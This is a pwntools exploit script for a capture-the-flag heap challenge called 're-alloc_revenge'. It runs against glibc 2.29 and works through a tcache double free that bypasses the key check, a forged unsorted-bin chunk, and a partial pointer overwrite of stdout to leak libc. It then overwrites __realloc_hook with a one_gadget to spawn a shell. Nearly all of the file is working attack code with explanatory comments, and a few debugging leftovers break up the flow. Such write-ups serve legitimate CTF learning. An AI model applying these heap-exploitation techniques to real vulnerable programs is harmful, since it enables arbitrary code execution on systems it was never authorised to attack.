from pwn import *

elf = ELF('re-alloc_revenge')

p = process('./re-alloc_revenge_local', env={"LD_PRELOAD":"libc-2.29.so"}, aslr=False)
libc = ELF('libc-2.29.so')
one_gadgets = [0xe21ce, 0xe21d1, 0xe21d4, 0xe237f, 0xe2383, 0x106ef8]

context.terminal = ['tmux', 'splitw', '-h']
gdb.attach(proc.pidof(p)[0], gdbscript='''
                                    continue
                                    ''')


def alloc(index, size, data):
    p.sendlineafter("Your choice: ", "1")
    p.sendlineafter("Index:", str(index))
    p.sendlineafter("Size:", str(size))
    p.sendafter("Data:", data)

def realloc(index, size, data):
    p.sendlineafter("Your choice: ", "2")
    p.sendlineafter("Index:", str(index))
    p.sendlineafter("Size:", str(size))
    if size != 0:
        p.sendafter("Data:", data)

def free(index):
    p.sendlineafter("Your choice: ", "3")
    p.sendlineafter("Index:", str(index))
"""
ptr == 0: malloc(new_size)
ptr != 0 && new_size == 0: free(ptr)
ptr != 0 && new_size == old_size: edit (ptr)
ptr != 0 && new_size < old_size: edit(ptr) and free(remainder)
ptr != 0 && new_size > old_size: new_ptr = malloc(new_size); strcpy(new_ptr, ptr); free(ptr); return new_ptr;
"""

"""
stdout structure leak libc
_IO_puts --> _IO_sputn --> _IO_new_file_xsputn --> _IO_new_file_overflow

conditions of flags
_flags = 0xfbad0000                 // Magic number
_flags & = ~_IO_NO_WRITES           // _flags = 0xfbad0000
_flags | = _IO_CURRENTLY_PUTTING    // _flags = 0xfbad0800
_flags | = _IO_IS_APPENDING         // _flags = 0xfbad1800

_IO_read_ptr = 0;
_IO_read_end = 0;
_IO_read_base = 0;
_IO_write_base = 0x7fXXXXXXXX00;

"""
def solve():
    # create chunk 0x70, then split to 0x20 and 0x50
    alloc(0, 0x68, 'AAAA')
    realloc(0, 0, '')               # add chunk 0x70 to tcache 
    realloc(0, 0x18, 'AAAA')        # create chunk 0x20, add chunk 0x50 to tcache
    free(0)                         # add chunk 0x20 to tcache

    # double free chunk 0x50 
    alloc(0, 0x48, 'BBBB')          # take chunk 0x50 from tcache
    realloc(0, 0, '')               # free it 
    realloc(0, 0x48, 'B'*0x10)      # overwrite tcache->key check
    free(0)                         # double free

    # setup fake unsorted bin 0x450
    alloc(0, 0x48, 'CCCC')                      # heap[0] is chunk 0x50
    alloc(1, 0x68, 'C'*0x18 + p64(0x451))       # heap[1] is chunk 0x70 but size is 0x20, heap[1] = chunk 0x20 + heap[0] (fake size of heap[0] to 0x451) 
    free(1)                                     # free the 0x20 chunk right above the chunk 0x450

    # expand chunk 0x450
    for i in range(9):
        alloc(1, 0x58, "D")
        realloc(1, 0x78, "D")       # realloc to change its size, because this chunk near top_chunk => expand size
        free(1)                     # chunk 0x80 go to chunk instead of chunk 0x60, chunk 0x60 keep stay in heap so we can expand chunk 0x450=0x70*9+heap[0]

    # unsorted bin attack
    realloc(0, 0, '')               # free unsorted bin
    realloc(0, 0x38, b"\x60\xb7")   # change fd pointer of unsorted bin to stdout (bruteforce)
    p.interactive()

    # get chunk 0x50 from tcache, now in tcache 0x50 only has stdout chunk 
    alloc(1, 0x48, "E")
    
    # now heap[0] and heap[1] both point to same address, need to set to NULL
    realloc(1, 0x18, "E")      
    free(1)
    realloc(0, 0x18, "E"*0x10)      # overwrite tcache->key check 
    free(0)

    # overwrite _flags and conditions in stdout
    alloc(0, 0x48, p64(0xfbad1800)+p64(0)*2+b"libc:".rjust(8, b"\x00"))

    if len(p.recvuntil("libc:", timeout=1)) == 0:
        log.debug("failed")
        return
    libc.address = u64(p.recv(8)) - 0x1E5700
    one_gadget = libc.address + one_gadgets[5]
    realloc_hook = libc.symbols['__realloc_hook']
    log.info("libc base: %s"%hex(libc.address))
    log.info("realloc hook: %s" %hex(realloc_hook))
    log.info("one gadget: %s" % hex(one_gadget))
    log.info("io stdout:  %s" %hex(libc.symbols["_IO_2_1_stdout_"]))
    log.info("free hook:   %s" %hex(libc.symbols["__free_hook"]))
    log.info("io_list_all:  %s" %hex(libc.symbols['_IO_list_all']))

    p.interactive()

    # at this point, we cant use heap[0] anymore (because heap[0] contains the address of stdout in libc => invalid)
    # split chunk 0x80 to 0x20 and 0x60 (0x60 to tcache)
    alloc(1, 0x78, 'SSSS')
    realloc(1, 0, '')           # put chunk 0x80 to tcaches
    realloc(1, 0x18, 'S'*0x10)  # put chunk 0x60 to tcache
    free(1)                     # put chunk 0x20 to tcache 

    alloc(1, 0x78, 'S'*0x18 + p64(0x61) + p64(realloc_hook))        # overwrite fd pointers of chunk 0x60 in tcache
    free(1)

    # notice this time we only has 1 pointer, so we alloc 0x60 then free heap[1] b with another chunk index => avoid 0x60 pushed to tcache again
    alloc(1, 0x58, 'SSSS')
    realloc(1, 0x28, 'SSSS')           
    free(1)                             # set heap[1] to NULL 
    alloc(1, 0x58, p64(one_gadget))     # overwrite realloc_hook with one_gadget

    # pop shell
    p.recvuntil("Your choice: ")
    p.sendline("2")
    p.recvuntil("Index:")
    p.sendline("1")
    p.recvuntil("Size:")
    p.sendline(str(0x10))
    
    p.interactive()

if __name__ == '__main__':
    solve()

"""
carefull when realloc new_size > old_size with chunk near top_chunk, it will expand the old chunk
remember to prepare chunk to write to fd first
"""